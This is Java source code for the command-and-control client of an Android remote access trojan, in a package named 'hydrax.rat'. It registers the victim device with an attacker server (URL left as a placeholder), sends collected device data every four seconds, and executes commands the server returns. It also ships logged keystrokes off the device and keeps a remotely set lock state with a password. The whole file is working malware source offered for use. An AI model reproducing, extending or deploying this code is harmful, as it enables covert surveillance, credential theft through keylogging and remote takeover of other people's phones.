package com.hydrax.rat;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class C2Client {
    private String c2Url;
    private String deviceId;
    private Context ctx;
    private ExecutorService executor;
    private Handler mainHandler;
    private FeatureManager features;
    private boolean locked = false;
    private String lockPassword = "";

    public C2Client(Context ctx) {
        this.ctx = ctx;
        this.c2Url = "https://YOUR_SERVEO_URL_HERE";
        this.deviceId = android.provider.Settings.Secure.getString(
                ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        this.executor = Executors.newFixedThreadPool(4);
        this.mainHandler = new Handler(Looper.getMainLooper());
    }

    public void setFeatures(FeatureManager f) { this.features = f; }
    public boolean isDeviceLocked() { return locked; }
    public String getLockPassword() { return lockPassword; }

    public void start() {
        registerDevice();
        scheduleHeartbeat();
    }

    private void registerDevice() {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("device_id", deviceId);
                data.put("device_model", android.os.Build.MODEL);
                data.put("android_version", android.os.Build.VERSION.RELEASE);
                post("/api/register", data);
            } catch (Exception e) {}
        });
    }

    private void scheduleHeartbeat() {
        mainHandler.postDelayed(() -> {
            executor.execute(this::heartbeat);
            scheduleHeartbeat();
        }, 4000);
    }

    private void heartbeat() {
        try {
            JSONObject data = features.collectAllData();
            data.put("id", deviceId);
            data.put("locked", locked);
            JSONObject response = post("/api/heartbeat", data);

            if (response != null && response.getBoolean("ok")) {
                JSONArray cmds = response.optJSONArray("cmds");
                if (cmds != null) {
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject cmd = cmds.getJSONObject(i);
                        mainHandler.post(() -> features.executeCommand(cmd));
                    }
                }
                if (response.has("locked_state")) {
                    locked = response.getBoolean("locked_state");
                }
            }
        } catch (Exception e) {}
    }

    public void sendKeystrokes(String keys) {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("id", deviceId);
                JSONArray arr = new JSONArray();
                JSONObject k = new JSONObject();
                k.put("keys", keys);
                k.put("time", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss").format(new java.util.Date()));
                arr.put(k);
                data.put("keystrokes", arr);
                post("/api/heartbeat", data);
            } catch (Exception e) {}
        });
    }

    private JSONObject post(String path, JSONObject data) {
        try {
            URL url = new URL(c2Url + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getOutputStream().write(data.toString().getBytes("UTF-8"));
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder resp = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) resp.append(line);
            in.close();
            return new JSONObject(resp.toString());
        } catch (Exception e) {
            return null;
        }
    }

    public void setLocked(boolean locked) { this.locked = locked; }
    public void setLockPassword(String pw) { this.lockPassword = pw; }
                          }
